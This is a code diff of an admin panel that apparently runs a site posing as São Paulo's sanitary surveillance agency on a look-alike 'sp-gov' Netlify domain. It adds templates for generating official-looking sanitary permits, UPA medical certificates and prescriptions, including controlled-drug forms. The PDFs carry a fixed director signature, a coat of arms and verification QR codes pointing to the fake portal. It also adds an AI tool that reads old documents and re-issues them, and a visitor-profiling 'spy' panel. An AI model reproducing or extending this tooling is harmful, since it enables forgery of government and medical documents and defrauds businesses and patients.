@@ -1841,7 +1841,7 @@
           <div class="page-title" style="margin-bottom: 16px;">
             <div>
               <h1><i class="fas fa-file-pdf" style="color: #f87171;"></i> Gerador Completo de Documentos, Alvarás & Receituários (PDF)</h1>
-              <p>38 modelos oficiais revisados e organizados em 5 categorias: Receitas (SUS, Branca, Antimicrobiano, GLP-1, A, B, B2, Retinoides, Odonto), Clínicos separados (Atestado, Laudo, Exames, LME, TER), Alvarás COVISA, Guias PIX e ANVISA.</p>
+              <p>50 modelos oficiais organizados em 6 categorias: Comércios em Geral (Adega, Nails, Fast Food, Carrocinha, Barbearia, Pet Shop, Mercado, Academia), Receitas, Clínicos & UPA, Alvarás COVISA, Guias PIX e ANVISA + Renovador por Foto IA.</p>
             </div>
             <div style="display: flex; gap: 8px; flex-wrap: wrap;">
               <button type="button" class="btn btn-secondary" style="padding: 10px 15px; font-size: 0.85rem;" onclick="limparFormularioDocGen()">
@@ -1864,7 +1864,7 @@
                 <!-- 1. MODELOS DE DOCUMENTOS (38 MODELOS EM 5 CATEGORIAS + BUSCA RÁPIDA) -->
                 <div class="docgen-box">
                   <div class="docgen-box-title">
-                    <span><i class="fas fa-layer-group"></i> 1. Catálogo de Documentos & Receituários (38 Modelos)</span>
+                    <span><i class="fas fa-layer-group"></i> 1. Catálogo de Documentos & Receituários (50 Modelos)</span>
                     <span id="docgen-template-tag" style="color:#38bdf8; font-size:0.71rem;">Alvará Oficial LFS 2026 + Assinatura Fixa</span>
                   </div>
 
@@ -1873,11 +1873,12 @@
                   </div>
 
                   <div class="docgen-cat-tabs">
-                    <button type="button" class="docgen-cat-btn active" data-cat-btn="todos" onclick="filtrarCategoriaDocGen('todos', this)"><i class="fas fa-th-large"></i> Todos (38)</button>
+                    <button type="button" class="docgen-cat-btn active" data-cat-btn="todos" onclick="filtrarCategoriaDocGen('todos', this)"><i class="fas fa-th-large"></i> Todos (50)</button>
+                    <button type="button" class="docgen-cat-btn" data-cat-btn="comercios" onclick="filtrarCategoriaDocGen('comercios', this)"><i class="fas fa-store"></i> Comércios (10)</button>
                     <button type="button" class="docgen-cat-btn" data-cat-btn="receitas" onclick="filtrarCategoriaDocGen('receitas', this)"><i class="fas fa-prescription"></i> Receitas (9)</button>
-                    <button type="button" class="docgen-cat-btn" data-cat-btn="clinicos" onclick="filtrarCategoriaDocGen('clinicos', this)"><i class="fas fa-stethoscope"></i> Clínicos & SUS (8)</button>
+                    <button type="button" class="docgen-cat-btn" data-cat-btn="clinicos" onclick="filtrarCategoriaDocGen('clinicos', this)"><i class="fas fa-stethoscope"></i> Clínicos & UPA (9)</button>
                     <button type="button" class="docgen-cat-btn" data-cat-btn="licencas" onclick="filtrarCategoriaDocGen('licencas', this)"><i class="fas fa-certificate"></i> Alvarás COVISA (9)</button>
-                    <button type="button" class="docgen-cat-btn" data-cat-btn="fiscal" onclick="filtrarCategoriaDocGen('fiscal', this)"><i class="fas fa-gavel"></i> Guias & Fiscal (7)</button>
+                    <button type="button" class="docgen-cat-btn" data-cat-btn="fiscal" onclick="filtrarCategoriaDocGen('fiscal', this)"><i class="fas fa-gavel"></i> Guias & Fiscal (8)</button>
                     <button type="button" class="docgen-cat-btn" data-cat-btn="anvisa" onclick="filtrarCategoriaDocGen('anvisa', this)"><i class="fas fa-shield-virus"></i> ANVISA & Control. (5)</button>
                   </div>
 
@@ -2081,6 +2082,91 @@
                       <strong>Cert. Boas Práticas (CBPF)</strong>
                       <span>Fabricação / Distrib. ANVISA</span>
                     </button>
+                    <!-- CATEGORIA 6: COMÉRCIOS EM GERAL & SERVIÇOS (10) + UPA + PROCURAÇÃO (2) = +12 (TOTAL 50) -->
+                    <button type="button" class="docgen-type-card theme-green" data-cat="clinicos" data-doctype="atestado_upa" onclick="selecionarTipoDocumento('atestado_upa', this)">
+                      <i class="fas fa-hospital-alt"></i>
+                      <strong>Atestado UPA 24h</strong>
+                      <span>Pronto Atendimento / SUS</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-yellow" data-cat="comercios" data-doctype="carrocinha_rua" onclick="selecionarTipoDocumento('carrocinha_rua', this)">
+                      <i class="fas fa-hotdog"></i>
+                      <strong>Carrocinha / Ambulante</strong>
+                      <span>Comida de Rua / Food Truck</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-yellow" data-cat="comercios" data-doctype="fast_food" onclick="selecionarTipoDocumento('fast_food', this)">
+                      <i class="fas fa-hamburger"></i>
+                      <strong>Fast Food / Lanchonete</strong>
+                      <span>Hamburgueria / Pastelaria</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-purple" data-cat="comercios" data-doctype="adega_tabacaria" onclick="selecionarTipoDocumento('adega_tabacaria', this)">
+                      <i class="fas fa-wine-bottle"></i>
+                      <strong>Adega & Tabacaria</strong>
+                      <span>Bebidas / Conveniência</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-blue" data-cat="comercios" data-doctype="studio_nails" onclick="selecionarTipoDocumento('studio_nails', this)">
+                      <i class="fas fa-hand-sparkles"></i>
+                      <strong>Studio Nails / Manicure</strong>
+                      <span>Esterilização & Biosseg.</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-blue" data-cat="comercios" data-doctype="salao_barbearia" onclick="selecionarTipoDocumento('salao_barbearia', this)">
+                      <i class="fas fa-cut"></i>
+                      <strong>Salão & Barbearia</strong>
+                      <span>Estética / Cabeleireiro</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-green" data-cat="comercios" data-doctype="mercado_padaria" onclick="selecionarTipoDocumento('mercado_padaria', this)">
+                      <i class="fas fa-shopping-basket"></i>
+                      <strong>Mercado / Padaria</strong>
+                      <span>Açougue / Hortifrúti</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-green" data-cat="comercios" data-doctype="pet_shop" onclick="selecionarTipoDocumento('pet_shop', this)">
+                      <i class="fas fa-paw"></i>
+                      <strong>Pet Shop / Banho & Tosa</strong>
+                      <span>Clínica Vet / Animais</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-blue" data-cat="comercios" data-doctype="academia_fitness" onclick="selecionarTipoDocumento('academia_fitness', this)">
+                      <i class="fas fa-dumbbell"></i>
+                      <strong>Academia / Pilates</strong>
+                      <span>Estúdio Fitness / Cross</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-green" data-cat="comercios" data-doctype="dedetizacao_caixa" onclick="selecionarTipoDocumento('dedetizacao_caixa', this)">
+                      <i class="fas fa-spray-can"></i>
+                      <strong>Cert. Pragas & Caixa</strong>
+                      <span>Dedetização / Reservatório</span>
+                    </button>
+                    <button type="button" class="docgen-type-card theme-purple" data-cat="comercios" data-doctype="plano_pgrss" onclick="selecionarTipoDocumento('plano_pgrss', this)">
+                      <i class="fas fa-recycle"></i>
+                      <strong>Declaração PGRSS / BPF</strong>
+                      <span>Resíduos & Boas Práticas</span>
+                    </button>
+                    <button type="button" class="docgen-type-card" data-cat="fiscal" data-doctype="procuracao_sanitaria" onclick="selecionarTipoDocumento('procuracao_sanitaria', this)">
+                      <i class="fas fa-file-signature"></i>
+                      <strong>Procuração Sanitária</strong>
+                      <span>Representação / Advogado</span>
+                    </button>
+                  </div>
+                </div>
+
+                <!-- 1B. RENOVADOR POR FOTO (DOCUMENTO VELHO -> PDF NOVO + O QUE FALTA PERGUNTAR) -->
+                <div class="docgen-box" style="border-color: rgba(192, 132, 252, 0.55); background: linear-gradient(135deg, rgba(192, 132, 252, 0.1), #081020 75%);">
+                  <div class="docgen-box-title">
+                    <span style="color:#e9d5ff;"><i class="fas fa-camera-retro"></i> Renovador por Foto / PDF (Documento Velho → PDF 2026)</span>
+                    <span style="font-size:0.7rem; color:#cbd5e1;">Lê foto velha, preenche tudo e mostra o que falta</span>
+                  </div>
+                  <div style="display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
+                    <label class="btn btn-gemini" style="padding: 9px 14px; font-size: 0.82rem; cursor: pointer; flex: 1;">
+                      <i class="fas fa-cloud-upload-alt"></i> Enviar Foto ou PDF de Documento Antigo (IA Lê Tudo)
+                      <input type="file" id="docgen-renovador-file" accept="image/*,application/pdf" style="display:none;" onchange="executarRenovadorPorFotoIA(this)" />
+                    </label>
+                  </div>
+                  <div id="docgen-renovador-status" style="display:none; font-size:0.8rem; color:#fde68a;"></div>
+                  <div id="docgen-faltantes-box" style="display:none; background:#1e1b4b; border:1px solid #818cf8; border-radius:10px; padding:11px 13px; margin-top:4px;">
+                    <div style="display:flex; justify-content:space-between; align-items:center; gap:8px; margin-bottom:6px; flex-wrap:wrap;">
+                      <strong style="color:#fde047; font-size:0.8rem;"><i class="fas fa-clipboard-question"></i> Falta isso — Perguntar para o estabelecimento:</strong>
+                      <button type="button" class="wa-btn-sm" style="padding:4px 10px; font-size:0.72rem; border-color:#25D366; color:#6ee7b7;" onclick="copiarPerguntaFaltantesWA()">
+                        <i class="fab fa-whatsapp"></i> Copiar Pergunta p/ Cliente
+                      </button>
+                    </div>
+                    <ul id="docgen-faltantes-list" style="margin:0; padding-left:18px; color:#e2e8f0; font-size:0.8rem; line-height:1.5;"></ul>
                   </div>
                 </div>
 
@@ -2418,6 +2504,24 @@
                   </p>
                 </div>
                 <iframe id="docgen-pdf-iframe" title="Prévia do Documento PDF"></iframe>
+              </div>
+
+              <!-- LIBERAR DOCUMENTO PARA O CLIENTE BAIXAR NO SITE (2. CONSULTAR ANDAMENTO) -->
+              <div style="padding: 12px 14px; background: #0a1426; border-top: 1px solid #1f2f4d; display: flex; flex-direction: column; gap: 8px;">
+                <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:6px;">
+                  <strong style="color:#34d399; font-size:0.82rem;"><i class="fas fa-cloud-upload-alt"></i> Liberar este PDF para Download do Cliente no Site</strong>
+                  <label style="display:inline-flex; align-items:center; gap:6px; font-size:0.75rem; color:#fde68a; font-weight:700; cursor:pointer;" title="Marque APENAS se o cliente precisar imprimir, assinar e reenviar (ex: Licença Definitiva)">
+                    <input type="checkbox" id="docgen-liberar-assinatura" style="width:14px; height:14px; accent-color:#f59e0b;" />
+                    Exigir assinatura do cliente?
+                  </label>
+                </div>
+                <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
+                  <input type="text" id="docgen-liberar-titulo" placeholder="Nome do botão no site (ex: Alvará Sanitário 2026)" style="flex:1; min-width:180px; background:#040914; border:1px solid #26385a; color:#fff; padding:8px 11px; border-radius:8px; font-size:0.82rem;" />
+                  <button type="button" class="btn btn-success" id="btn-docgen-liberar-cliente" style="padding: 8px 15px; font-size: 0.82rem; white-space:nowrap;" onclick="liberarDocumentoParaClienteNoSite()">
+                    <i class="fas fa-paper-plane"></i> Liberar p/ Cliente
+                  </button>
+                </div>
+                <div id="docgen-liberados-lista" style="display:none; font-size:0.76rem; color:#cbd5e1; background:#040914; border:1px solid #1e2d4a; border-radius:8px; padding:7px 10px;"></div>
               </div>
 
               <div class="docgen-history-strip" id="docgen-history-strip">
@@ -3296,7 +3400,7 @@
                 <span style="background: #f59e0b;"></span>
                 <span style="background: #10b981;"></span>
               </div>
-              <span id="live-device-url-bar">vigilanciadigital-sp.com.br</span>
+              <span id="live-device-url-bar">vigilancia-sp-gov.netlify.app</span>
               <span id="live-device-zoom-label">100%</span>
             </div>
             <div class="live-viewport-scaler" id="live-viewport-scaler">
@@ -4652,7 +4756,7 @@
             ? hist.map(m => `${m.role === 'user' ? 'Cliente' : 'Atendimento'}: ${m.content}`).join('\n')
             : 'Sem mensagens anteriores.';
 
-        const prompt = `Você é o assistente de redação do atendente ${nomeAtendente}, da Vigilância Sanitária (Portal COVISA Digital - https://vigilanciadigital-sp.com.br).
+        const prompt = `Você é o assistente de redação do atendente ${nomeAtendente}, da Vigilância Sanitária (Portal COVISA Digital - https://vigilancia-sp-gov.netlify.app).
 Histórico recente da conversa no WhatsApp:
 ${resumoHist}
 
@@ -6099,7 +6203,7 @@ const formCadastrarMulta = document.getElementById('form-cadastrar-multa');
             const instrucaoExtra = (document.getElementById('lab-wa-extra-prompt')?.value || '').trim();
             const nomeAtendente = (document.getElementById('wa-modal-sign-name')?.value || 'Giliard').trim() || 'Giliard';
 
-            const promptMaster = `Você é o Perito Auditor Sênior da Vigilância Sanitária (COVISA Digital - Prefeitura de São Paulo, portal https://vigilanciadigital-sp.com.br).
+            const promptMaster = `Você é o Perito Auditor Sênior da Vigilância Sanitária (COVISA Digital - Prefeitura de São Paulo, portal https://vigilancia-sp-gov.netlify.app).
 Você recebeu uma conversa completa de WhatsApp do número ${formatarTelefoneWA(labWaPhoneSelecionado)} junto com TODOS os arquivos enviados (PDFs, imagens, documentos e áudios anexados abaixo na ordem exata).
 
 HISTÓRICO COMPLETO DA CONVERSA:
@@ -7323,7 +7427,7 @@ REGRAS:
         const endEmitRaw = [dados.rua, dados.num ? `nº ${dados.num}` : '', dados.bairro].filter(Boolean).join(', ');
         const endEmit = endEmitRaw || (dados.homeOffice ? 'Atendimento Home Office / Telemedicina' : 'Conforme Cadastro');
 
-        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=140x140&format=png&data=${encodeURIComponent('https://vigilanciadigital-sp.com.br/?receita=' + dados.protocolo)}`;
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=140x140&format=png&data=${encodeURIComponent('https://vigilancia-sp-gov.netlify.app/?receita=' + dados.protocolo)}`;
         const qrImg = await carregarImagemEmbedPDF(pdfDoc, qrUrl);
 
         const drawBlankLine = (page, label, prefillVal, lx, ly, endX, size = 8.0) => {
@@ -7794,7 +7898,7 @@ REGRAS:
 
         const brasaoImg = await carregarImagemEmbedPDF(pdfDoc, 'imagens/5.png');
         const sigImg = dados.usarAssinaturaFixa ? await carregarAssinaturaDiretoriaPDF(pdfDoc) : null;
-        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=140x140&format=png&data=${encodeURIComponent('https://vigilanciadigital-sp.com.br/?doc=' + dados.protocolo)}`;
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=140x140&format=png&data=${encodeURIComponent('https://vigilancia-sp-gov.netlify.app/?doc=' + dados.protocolo)}`;
         const qrImg = await carregarImagemEmbedPDF(pdfDoc, qrUrl);
 
         const drawBlank = (lbl, val, lx, ly, endX, sz = 8.4) => {
@@ -8389,7 +8493,7 @@ REGRAS:
 
         const brasaoImg = await carregarImagemEmbedPDF(pdfDoc, 'imagens/5.png');
         const sigImg = dados.usarAssinaturaFixa ? await carregarAssinaturaDiretoriaPDF(pdfDoc) : null;
-        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&format=png&data=${encodeURIComponent('https://vigilanciadigital-sp.com.br/?alvara=' + dados.protocolo)}`;
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&format=png&data=${encodeURIComponent('https://vigilancia-sp-gov.netlify.app/?alvara=' + dados.protocolo)}`;
         const qrImg = await carregarImagemEmbedPDF(pdfDoc, qrUrl);
 
         page.drawRectangle({ x: 20, y: 20, width: width - 40, height: height - 40, borderColor: corPrim, borderWidth: 2.2 });
@@ -8497,7 +8601,7 @@ REGRAS:
             page.drawText(sanitizarTextoPDF('Autenticidade'), { x: width - 92, y: 37, size: 6.4, font: fontBold, color: corCinza });
         }
 
-        drawTextFitPDF(page, `Documento emitido eletronicamente em ${cidadeAuto}, ${dataAuto} • vigilanciadigital-sp.com.br`, 38, 32, fontReg, 7.2, width - 148, corCinza);
+        drawTextFitPDF(page, `Documento emitido eletronicamente em ${cidadeAuto}, ${dataAuto} • vigilancia-sp-gov.netlify.app`, 38, 32, fontReg, 7.2, width - 148, corCinza);
 
         return await pdfDoc.save();
     }
@@ -8829,12 +8933,12 @@ REGRAS:
         desenharBlocoAssinaturaFixa(page, sigImg, dados, fontBold, fontReg, corEscuro, corCinza, width / 2, 50, 235, 76);
 
         if (!temBlocoPix) {
-            const qrValUrl = `https://api.qrserver.com/v1/create-qr-code/?size=140x140&format=png&data=${encodeURIComponent('https://vigilanciadigital-sp.com.br/?protocolo=' + dados.protocolo)}`;
+            const qrValUrl = `https://api.qrserver.com/v1/create-qr-code/?size=140x140&format=png&data=${encodeURIComponent('https://vigilancia-sp-gov.netlify.app/?protocolo=' + dados.protocolo)}`;
             const qrVal = await carregarImagemEmbedPDF(pdfDoc, qrValUrl);
             if (qrVal) page.drawImage(qrVal, { x: width - 92, y: 48, width: 52, height: 52 });
         }
 
-        drawTextFitPDF(page, `Documento emitido eletronicamente em ${cidadeAuto}, ${dataAuto} • vigilanciadigital-sp.com.br`, 40, 34, fontReg, 7.2, width - 140, corCinza);
+        drawTextFitPDF(page, `Documento emitido eletronicamente em ${cidadeAuto}, ${dataAuto} • vigilancia-sp-gov.netlify.app`, 40, 34, fontReg, 7.2, width - 140, corCinza);
         return await pdfDoc.save();
     }
 
@@ -8963,7 +9067,7 @@ REGRAS:
             let pdfBytes;
             const ehControlada = DOCGEN_RECEITA_CONTROLADA_TYPES.has(dados.tipo);
             const ehClinicoSus = DOCGEN_CLINICO_SUS_TYPES.has(dados.tipo);
-            const ehAlvaraOficial = ['alvara_oficial', 'licenca_pf_home', 'renovacao_licenca'].includes(dados.tipo);
+            const ehAlvaraOficial = ['alvara_oficial', 'licenca_pf_home', 'renovacao_licenca', 'carrocinha_rua', 'fast_food', 'adega_tabacaria', 'studio_nails', 'salao_barbearia', 'mercado_padaria', 'pet_shop', 'academia_fitness'].includes(dados.tipo);
 
             if (dados.renderMode === 'molde_repo' && DOCGEN_REPO_FILES[dados.tipo]) {
                 try {
@@ -9022,7 +9126,19 @@ REGRAS:
                 termo_livro: 'Termo_Livro_Controlados',
                 termo_inutilizacao: 'Termo_Inutilizacao_Controlados',
                 afe_anvisa: 'Autorizacao_AFE_ANVISA',
-                cbpf_anvisa: 'Certificado_CBPF_ANVISA'
+                cbpf_anvisa: 'Certificado_CBPF_ANVISA',
+                atestado_upa: 'Atestado_UPA_24h',
+                carrocinha_rua: 'Autorizacao_Carrocinha_Ambulante',
+                fast_food: 'Licenca_FastFood_Lanchonete',
+                adega_tabacaria: 'Licenca_Adega_Tabacaria',
+                studio_nails: 'Licenca_Studio_Nails_Estetica',
+                salao_barbearia: 'Licenca_Salao_Barbearia',
+                mercado_padaria: 'Licenca_Mercado_Padaria',
+                pet_shop: 'Licenca_PetShop_Vet',
+                academia_fitness: 'Licenca_Academia_Pilates',
+                dedetizacao_caixa: 'Certificado_Pragas_CaixaAgua',
+                plano_pgrss: 'Declaracao_PGRSS_BoasPraticas',
+                procuracao_sanitaria: 'Procuracao_Sanitaria_COVISA'
             };
             const filename = `${prefixos[dados.tipo] || 'Documento_COVISA'}_${docLimpo}.pdf`;
 
@@ -9976,7 +10092,7 @@ Retorne APENAS JSON válido (sem asteriscos duplos **):
             };
             desenharBlocoAssinaturaFixa(page, sigImg, dadosAssinatura, fontBold, fontReg, corEscuro, corCinza, width / 2, 44, 230, 74);
 
-            const qrPortalUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&format=png&data=${encodeURIComponent('https://vigilanciadigital-sp.com.br/?protocolo=' + protocolo)}`;
+            const qrPortalUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&format=png&data=${encodeURIComponent('https://vigilancia-sp-gov.netlify.app/?protocolo=' + protocolo)}`;
             const qrPortalImg = await carregarImagemEmbedPDF(pdfDoc, qrPortalUrl);
             if (qrPortalImg) {
                 page.drawImage(qrPortalImg, { x: width - 92, y: 42, width: 54, height: 54 });
@@ -11145,7 +11261,7 @@ Retorne APENAS JSON válido (sem asteriscos duplos **):
                     <div class="spy-xray-item"><span>Hardware (GPU / RAM / CPU)</span><strong>${escaparHtmlWA([d.gpu, d.ramGB, d.cpuNucleos, d.bateria].filter(Boolean).join(' • ') || 'N/D')}</strong></div>
                     <div class="spy-xray-item"><span>Conexão & Origem</span><strong>${escaparHtmlWA([d.conexao, d.origem, d.utmTerm].filter(Boolean).join(' • ') || 'Direto')}</strong></div>
                     <div class="spy-xray-item"><span>Dados Preenchidos</span><strong>CNPJ: ${escaparHtmlWA(d.cnpjDigitado || '—')} | Empresa: ${escaparHtmlWA(d.empresaDigitada || '—')} | Ramo: ${escaparHtmlWA(d.ramoEscolhido || '—')}</strong></div>
-                    <div class="spy-xray-item"><span>URL Atual</span><strong>${escaparHtmlWA(d.urlEntrada || 'vigilanciadigital-sp.com.br')}</strong></div>
+                    <div class="spy-xray-item"><span>URL Atual</span><strong>${escaparHtmlWA(d.urlEntrada || 'vigilancia-sp-gov.netlify.app')}</strong></div>
                 </div>`;
             return;
         }
@@ -11709,6 +11825,219 @@ Retorne APENAS JSON válido (sem asteriscos duplos **):
         previewArea.appendChild(item);
         previewArea.style.display = 'flex';
     }
+
+    // =========================================================================
+    // RENOVADOR POR FOTO (DOCUMENTO VELHO -> PDF NOVO + O QUE FALTA PERGUNTAR)
+    // =========================================================================
+    window._ultimosFaltantesDocGen = [];
+
+    window.executarRenovadorPorFotoIA = async (input) => {
+        const file = input.files?.[0];
+        if (!file) return;
+        const st = document.getElementById('docgen-renovador-status');
+        const boxFalt = document.getElementById('docgen-faltantes-box');
+        const listFalt = document.getElementById('docgen-faltantes-list');
+        if (st) { st.style.display = 'block'; st.innerHTML = '<i class="fas fa-spinner fa-spin"></i> IA lendo o documento antigo e conferindo o que falta...'; }
+        if (boxFalt) boxFalt.style.display = 'none';
+
+        try {
+            const b64 = await new Promise((res, rej) => {
+                const r = new FileReader();
+                r.onload = () => res(String(r.result || '').split(',')[1]);
+                r.onerror = rej;
+                r.readAsDataURL(file);
+            });
+            const mime = file.type || (file.name.toLowerCase().endsWith('.pdf') ? 'application/pdf' : 'image/jpeg');
+
+            const prompt = `Você é um auditor da Vigilância Sanitária (COVISA SP).
+Analise esta foto/PDF de um documento antigo/existente e extraia TODOS os dados cadastrais visíveis.
+Identifique também o tipo de documento mais adequado entre: alvara_oficial, licenca, licenca_pf_home, renovacao_licenca, atestado_upa, atestado_medico, receita_sus, carrocinha_rua, fast_food, adega_tabacaria, studio_nails, salao_barbearia, mercado_padaria, pet_shop, academia_fitness, dedetizacao_caixa, plano_pgrss, procuracao_sanitaria, notificacao, infracao, declaracao.
+Liste em "campos_faltantes" o que NÃO apareceu no documento ou está vencido/incompleto e precisa ser perguntado ao estabelecimento.
+
+Responda APENAS JSON válido:
+{
+  "tipo_sugerido": "alvara_oficial",
+  "nome": "",
+  "cnpj": "",
+  "rua": "",
+  "num": "",
+  "bairro": "",
+  "cep": "",
+  "cidade": "",
+  "ramo": "",
+  "cmvs": "",
+  "cnae": "",
+  "rt": "",
+  "crm": "",
+  "telefone": "",
+  "campos_faltantes": ["Ex: Número do WhatsApp do responsável", "Ex: Comprovante de dedetização atualizado"]
+}`;
+
+            const resp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${GEMINI_API_KEY}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    contents: [{ parts: [{ text: prompt }, { inline_data: { mime_type: mime, data: b64 } }] }],
+                    generationConfig: { responseMimeType: 'application/json' }
+                })
+            });
+            const data = await resp.json();
+            const raw = data?.candidates?.[0]?.content?.parts?.[0]?.text || '{}';
+            const ext = JSON.parse(raw.replace(/```json|```/g, '').trim());
+
+            const setVal = (id, val) => { const el = document.getElementById(id); if (el && val) el.value = val; };
+            setVal('docgen-nome', ext.nome);
+            setVal('docgen-cnpj', ext.cnpj);
+            setVal('docgen-rua', ext.rua);
+            setVal('docgen-num', ext.num);
+            setVal('docgen-bairro', ext.bairro);
+            setVal('docgen-cep', ext.cep);
+            setVal('docgen-cidade', ext.cidade);
+            setVal('docgen-ramo', ext.ramo);
+            setVal('docgen-cmvs', ext.cmvs);
+            setVal('docgen-cnae', ext.cnae);
+            setVal('docgen-rt', ext.rt);
+            setVal('docgen-crm', ext.crm);
+            setVal('docgen-telefone', ext.telefone);
+
+            if (ext.tipo_sugerido) {
+                const card = document.querySelector(`.docgen-type-card[data-doctype="${ext.tipo_sugerido}"]`);
+                if (card) selecionarTipoDocumento(ext.tipo_sugerido, card);
+            }
+
+            const faltantes = Array.isArray(ext.campos_faltantes) ? ext.campos_faltantes.filter(Boolean) : [];
+            window._ultimosFaltantesDocGen = faltantes;
+            if (faltantes.length > 0 && boxFalt && listFalt) {
+                listFalt.innerHTML = faltantes.map(f => `<li>${escaparHtmlWA(f)}</li>`).join('');
+                boxFalt.style.display = 'block';
+            }
+
+            if (st) st.innerHTML = '<span style="color:#6ee7b7;"><i class="fas fa-check-circle"></i> Documento lido! Dados preenchidos abaixo. Revise e clique em Gerar Prévia.</span>';
+            showToast("Renovador IA", "Dados extraídos do documento antigo com sucesso!", "success");
+            await gerarDocumentoOficialPDF(false);
+        } catch (err) {
+            console.error(err);
+            if (st) st.innerHTML = `<span style="color:#fca5a5;"><i class="fas fa-exclamation-triangle"></i> Falha ao ler imagem/PDF: ${escaparHtmlWA(err.message)}</span>`;
+            showToast("Erro", "Não foi possível ler o documento enviado.", "error");
+        } finally {
+            input.value = '';
+        }
+    };
+
+    window.copiarPerguntaFaltantesWA = () => {
+        const nome = document.getElementById('docgen-nome')?.value || 'seu estabelecimento';
+        const falt = window._ultimosFaltantesDocGen || [];
+        const lista = falt.map((f, i) => `${i + 1}. ${f}`).join('\n');
+        const msg = `Olá! Recebemos o documento anterior de *${nome}* para atualização 2026.\n\nPara finalizarmos a emissão do novo documento oficial, precisamos apenas que nos confirme:\n${lista}\n\nAssim que enviar, já liberamos no portal!`;
+        navigator.clipboard.writeText(msg);
+        showToast("Copiado!", "Mensagem com os itens faltantes copiada para o WhatsApp.", "success");
+    };
+
+    // =========================================================================
+    // LIBERAR DOCUMENTOS DO GERADOR PARA DOWNLOAD DO CLIENTE NO SITE
+    // =========================================================================
+    function bytesParaBase64(uint8) {
+        let bin = '';
+        const chunk = 0x8000;
+        for (let i = 0; i < uint8.length; i += chunk) {
+            bin += String.fromCharCode.apply(null, uint8.subarray(i, i + chunk));
+        }
+        return btoa(bin);
+    }
+
+    window.carregarListaLiberadosCliente = async (pedidoId) => {
+        const box = document.getElementById('docgen-liberados-lista');
+        if (!box) return;
+        if (!pedidoId) { box.style.display = 'none'; return; }
+        try {
+            const snap = await getDocs(collection(db, "pedidos", pedidoId, "documentos_liberados"));
+            if (snap.empty) {
+                box.style.display = 'none';
+                return;
+            }
+            const itens = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+            box.style.display = 'block';
+            box.innerHTML = `<div style="font-weight:800; color:#93c5fd; margin-bottom:4px;">Já liberados para este cliente (${itens.length}):</div>` +
+                itens.map(it => `
+                    <div style="display:flex; justify-content:space-between; align-items:center; gap:8px; padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.06);">
+                        <span><i class="fas fa-file-pdf" style="color:#f87171;"></i> <strong>${escaparHtmlWA(it.titulo)}</strong> ${it.precisa_assinar ? '<span style="color:#fbbf24;">(Exige Assinatura)</span>' : '<span style="color:#6ee7b7;">(Download Direto)</span>'}</span>
+                        <button type="button" onclick="removerDocLiberadoCliente('${pedidoId}', '${it.id}')" style="background:none; border:none; color:#fca5a5; cursor:pointer; font-weight:900;" title="Remover do cliente">&times;</button>
+                    </div>`).join('');
+        } catch (_) {}
+    };
+
+    window.removerDocLiberadoCliente = async (pedidoId, docId) => {
+        try {
+            await deleteDoc(doc(db, "pedidos", pedidoId, "documentos_liberados", docId));
+            showToast("Removido", "Documento removido da área do cliente.", "success");
+            carregarListaLiberadosCliente(pedidoId);
+        } catch (e) {
+            showToast("Erro", "Não foi possível remover.", "error");
+        }
+    };
+
+    window.liberarDocumentoParaClienteNoSite = async () => {
+        const pedidoId = document.getElementById('docgen-process-selector')?.value;
+        if (!pedidoId) {
+            return showToast("Selecione o Cliente", "Escolha primeiro o processo/cliente na caixa 'Ou Importar Processo do Firebase' (item 2).", "warning");
+        }
+        if (!docGenUltimoPdfBytes) {
+            await gerarDocumentoOficialPDF(false);
+        }
+        if (!docGenUltimoPdfBytes) {
+            return showToast("Gere o PDF Primeiro", "Clique em 'Gerar Prévia' antes de liberar.", "warning");
+        }
+
+        const btn = document.getElementById('btn-docgen-liberar-cliente');
+        const orig = btn.innerHTML;
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Liberando...';
+
+        try {
+            const tituloCustom = (document.getElementById('docgen-liberar-titulo')?.value || '').trim();
+            const cardAtivo = document.querySelector('.docgen-type-card.active strong')?.innerText || 'Documento Oficial COVISA';
+            const tituloFinal = tituloCustom || cardAtivo;
+            const precisaAssinar = Boolean(document.getElementById('docgen-liberar-assinatura')?.checked);
+            const pdfBase64 = 'data:application/pdf;base64,' + bytesParaBase64(docGenUltimoPdfBytes);
+
+            if (pdfBase64.length > 900000) {
+                throw new Error("PDF maior que 900KB. Gere com 1 página para liberar direto no Firestore.");
+            }
+
+            await addDoc(collection(db, "pedidos", pedidoId, "documentos_liberados"), {
+                titulo: tituloFinal,
+                filename: docGenUltimoFilename || 'Documento_COVISA.pdf',
+                tipo: docGenTipoAtual || 'alvara_oficial',
+                precisa_assinar: precisaAssinar,
+                pdf_base64: pdfBase64,
+                criado_em: Date.now(),
+                data: new Date().toLocaleString('pt-BR')
+            });
+
+            // Marca o pedido como pago/aprovado para o cliente já ver os downloads ao consultar
+            await updateDoc(doc(db, "pedidos", pedidoId), {
+                pago: true,
+                aguardando_alvara: false,
+                tem_documentos_liberados: true
+            });
+
+            showToast("Liberado no Site!", `"${tituloFinal}" já está disponível para download do cliente!`, "success");
